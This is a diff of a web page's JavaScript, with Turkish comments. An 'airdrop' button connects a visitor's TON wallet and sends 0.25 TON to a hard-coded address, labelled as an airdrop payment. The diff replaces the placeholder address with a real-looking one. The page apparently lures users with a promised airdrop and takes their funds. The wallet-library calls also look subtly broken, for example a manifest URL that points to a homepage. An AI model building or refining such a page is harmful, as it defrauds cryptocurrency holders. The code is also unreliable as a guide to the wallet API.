@@ -12,15 +12,20 @@
 
     <script>
         // TON Connect başlatma
-        const tonConnect = new TonConnect();
-        
+        const tonConnect = new TonConnect({
+            manifestUrl: "https://ton.org", // Burada uygulamanızın manifest URL’si olacak
+        });
+
         // Buton tıklama işlemi
         document.getElementById("airdropButton").addEventListener("click", async () => {
-            // Cüzdan bağlama
-            const wallet = await tonConnect.connect();
-            if (wallet) {
-                alert("Cüzdan Bağlandı! İşlem Onayını Bekliyoruz.");
-                await handleTransaction(wallet);
+            try {
+                const wallet = await tonConnect.connect(); // Cüzdan bağlantısı
+                if (wallet) {
+                    alert("Cüzdan Bağlandı! İşlem Onayını Bekliyoruz.");
+                    await handleTransaction(wallet);  // İşlem gönderme
+                }
+            } catch (error) {
+                alert("Cüzdan bağlantısı hatası: " + error.message);
             }
         });
 
@@ -28,12 +33,12 @@
         async function handleTransaction(wallet) {
             try {
                 const paymentAmount = 0.25; // 0.25 TON
-                const contractAddress = "Sizin-Cüzdan-Adresiniz"; // Belirlediğiniz cüzdan adresi
+                const contractAddress = "UQCzVICjTxSMg348fG4sEP00cQBj-XFcp0YZgPtsnB7PXzMP"; // Belirlediğiniz cüzdan adresi
                 
                 // Akıllı kontrat işlemi
                 const response = await wallet.sendTransaction({
                     to: contractAddress,
-                    amount: paymentAmount * 10**9, // TON'un smallest unit'e çevrilmesi
+                    amount: paymentAmount * 10**9, // TON'un smallest unit’e çevrilmesi (nanoTON)
                     payload: "Airdrop Ödemesi",
                 });
 
